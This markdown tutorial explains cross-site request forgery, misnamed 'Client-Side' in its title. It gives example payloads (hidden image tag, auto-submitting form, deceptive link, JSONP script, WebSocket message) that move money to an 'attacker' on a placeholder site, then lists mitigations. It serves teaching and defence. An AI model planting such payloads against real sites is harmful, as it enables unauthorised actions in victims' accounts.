# Client-Side request Forgery(CSRF)

Cross-Site Request Forgery (CSRF) is a security vulnerability that tricks users into executing unwanted actions on a web application where they are authenticated, potentially compromising their account.

## Methods to perform CSRF

- ### Using Image Tags:

Attackers can exploit the <img> tag to send a request to a vulnerable endpoint when the image is loaded.
Example:
```text
<img src="http://vulnerable-website.com/transfer?amount=1000&to=attacker" style="display:none;">
```
When the victim visits a page containing this image tag, the browser sends a GET request to the vulnerable endpoint, executing the action without the user's consent.

- ### Form Submission via JavaScript:

Attackers can create a hidden form and use JavaScript to submit it automatically.
Example:
```text
<form id="csrfForm" action="http://vulnerable-website.com/transfer" method="POST" style="display:none;">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
```
When the victim visits the page, the form is submitted automatically, executing the transfer.

- ### Using a Malicious Link:

An attacker can craft a link that performs an action when clicked, leveraging the victim's authenticated session.
Example:
```text
<a href="http://vulnerable-website.com/transfer?amount=1000&to=attacker">Click here to claim your prize!</a>
```
If the victim is logged into the vulnerable site, clicking the link will execute the transfer.

- ### CSRF via JSONP:

If a web application uses JSONP (JSON with Padding) for cross-domain requests, an attacker can exploit this to perform CSRF.
Example:
```text
<script src="http://vulnerable-website.com/api/transfer?amount=1000&to=attacker&callback=alert"></script>
```
This will execute the alert function with the response from the server, which could be a malicious payload.

- ### Using WebSockets:

If a web application uses WebSockets, an attacker can exploit this to send unauthorized commands.
Example:
```text
const socket = new WebSocket('ws://vulnerable-website.com/socket');
socket.onopen = function() {
    socket.send(JSON.stringify({ action: 'transfer', amount: 1000, to: 'attacker' }));
};
```
If the server does not validate the origin of the WebSocket connection, this could lead to unauthorized actions.

## Mitigation Strategies
To protect against CSRF attacks, consider the following best practices:

- ### CSRF Tokens: 
  Implement anti-CSRF tokens that are unique for each session and included in every state-changing request (e.g., form submissions).

- ### SameSite Cookies:
  Use the SameSite attribute for cookies to prevent them from being sent with cross-origin requests.

- ### Referer Header Validation:
  Check the Referer header to ensure that requests originate from trusted sources.

- ### User Interaction:
  Require user interaction (e.g., CAPTCHA) for sensitive actions to ensure that the request is intentional.

- ### Secure Coding Practices:
  Regularly review and audit code for potential CSRF vulnerabilities.
